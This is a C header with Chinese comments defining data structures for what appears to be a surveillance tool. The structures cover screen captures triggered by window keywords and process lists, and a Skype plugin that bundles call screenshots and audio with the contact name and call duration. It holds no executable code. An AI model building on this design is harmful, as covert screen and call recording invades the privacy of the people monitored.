/********************************************************************
 * Filename:
 *     T5Screen.h
 * 
 * Author:
 *     xyz
 *
 * Time:
 *     2010/7/25   09:15
 * 
 * Note:
 *     
 *
 */	
#ifndef _TJ_T5_XQT_SCREEN_H_
#define _TJ_T5_XQT_SCREEN_H_

#define		CAPTURE_VERSION				0x00000001
#define		GZIP						(1)
#define		PRINT_SCREEN_MAGIC			0xFE801972
#define		KEYPROCESSWND				0x100
#define		KEYTITLEWINDOW				0x200
#define		FULLSCREEN					0x400

#define		THE_SAME_WINDOW(_LAST_WND)	\
	((_LAST_WND) == GetForegroundWindow())

#pragma pack(push)
#pragma pack(1)

//
// 截取参数结构
//
typedef struct _CAPTURE_CONFIG
{
	DWORD		dwSize;						
	BOOL		bCapWindow;					
	DWORD		dwWindowInterval;			
	DWORD		dwKeyListOffset;           
	DWORD		dwKeyListLength;            
	PWCHAR		lpwzKeyList;               
	DWORD		dwProcessListOffset;        
	DWORD		dwProcessListLength;        
	PWCHAR		lpwzProcessList;     
	
	// 在原有截图配置项中添加两个字段
	DWORD		dwRecordType;		// 0x00000001 - 拨入 0x00000002 - 拔出
	DWORD		dwRecordTime;		// 录取时间， 0 为不限时
} CAPTURE_CONFIG, *PCAPTURE_CONFIG;

//
// 保存文件的头部
//
typedef struct _CAPTURE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// 魔术数
	DWORD		dwPrintType;
	BYTE		bUnUsed[16];
	WCHAR		wzProcessName[64];		// 截取窗口的进程名
	FILETIME	ftSavetime;				// 截取时间
    
} CAPTURE_FILE_HEADER, *PCAPTURE_FILE_HEADER;

// Skype 音视频插件数据结构
// 视频截图与音频文件合并为一个
//
// +-------------------+-----------------------+----------+-----------------------+----------
// | SKYPE_FILE_HEADER | SKYPE_SUB_FILE_HEADER | 文件内容 | SKYPE_SUB_FILE_HEADER | 文件内容
// +-------------------+-----------------------+----------+-----------------------+----------

typedef struct _SKYPE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// 0xFF14FF14
	WCHAR		wzSaveTime[256];
	DWORD		dwDuraiton;				// 通话时长
	WCHAR		wzContract[256];		// 联系人
} SKYPE_FILE_HEADER, *PSKYPE_FILE_HEADER;

typedef struct _SKYPE_SUB_FILE_HEADER
{
	DWORD		dwFileType;				// 0 - 图片 1 - 音频
	DWORD		dwFileSize;				// 文件大小
	WCHAR		wzFileName[256];		// 文件名
}SKYPE_SUB_FILE_HEADER, *PSKYPE_SUB_FILE_HEADER;

#pragma pack(pop)

#endif